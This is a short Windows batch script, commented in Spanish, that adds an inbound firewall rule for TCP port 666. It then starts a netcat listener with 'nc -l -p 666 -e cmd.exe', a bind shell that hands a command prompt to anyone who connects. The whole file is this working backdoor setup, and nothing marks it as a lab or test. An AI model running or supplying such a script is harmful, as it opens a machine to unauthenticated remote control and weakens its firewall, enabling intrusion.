@echo off
echo Configurando el puerto 666 para la escucha...
netstat -ano | findstr ":666" > nul
if %errorlevel% equ 0 (
    echo El puerto 666 ya está en uso. No se puede configurar.
) else (
    netsh advfirewall firewall add rule name="Puerto 666 - Entrada" dir=in action=allow protocol=TCP localport=666 > nul
    echo El puerto 666 está configurado para la escucha.
    echo Esperando una conexión tipo shell...
    cmd /c "nc -l -p 666 -e cmd.exe"
)
pause
